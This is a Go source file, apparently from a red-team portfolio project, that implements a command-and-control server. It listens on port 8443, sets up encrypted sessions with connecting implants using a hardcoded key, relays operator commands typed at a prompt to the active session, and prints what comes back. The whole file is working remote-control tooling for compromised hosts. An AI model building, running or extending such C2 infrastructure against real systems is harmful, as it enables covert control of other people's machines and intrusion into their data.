package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"

	"redteam-portfolio/pkg/comms"
)

const sessionKeyHex = "c9e4737ac9b481b70809fc372d13ef97a921c5fea7bfd3773b10b8213986bef3"

var (
	activeSession *comms.SecureConn
	mu            sync.Mutex
)

func main() {
	listener, err := net.Listen("tcp", "0.0.0.0:8443")
	if err != nil {
		panic(err)
	}
	defer listener.Close()

	fmt.Println("[C2] Listening on 0.0.0.0:8443")
	go acceptLoop(listener)

	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("[C2] > ")
		cmd, _ := reader.ReadString('\n')
		cmd = strings.TrimSpace(cmd)
		if cmd == "" {
			continue
		}

		mu.Lock()
		sess := activeSession
		mu.Unlock()

		if sess == nil {
			fmt.Println("[C2] No active session")
			continue
		}

		if err := sess.WriteMessage([]byte(cmd)); err != nil {
			fmt.Printf("[C2] Send error: %v\n", err)
		}
	}
}

func acceptLoop(listener net.Listener) {
	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}

		sess, err := comms.NewSecureConn(conn, sessionKeyHex)
		if err != nil {
			conn.Close()
			continue
		}

		mu.Lock()
		if activeSession != nil {
			activeSession.Close()
		}
		activeSession = sess
		mu.Unlock()

		fmt.Printf("[C2] New encrypted session: %s\n", conn.RemoteAddr().String())
		go handleSession(sess)
	}
}

func handleSession(sess *comms.SecureConn) {
	defer func() {
		sess.Close()
		mu.Lock()
		if activeSession == sess {
			activeSession = nil
		}
		mu.Unlock()
		fmt.Println("[C2] Session closed")
	}()

	for {
		msg, err := sess.ReadMessage()
		if err != nil {
			return
		}
		if string(msg) == "ready" {
			continue
		}
		fmt.Printf("%s\n", msg)
	}
}
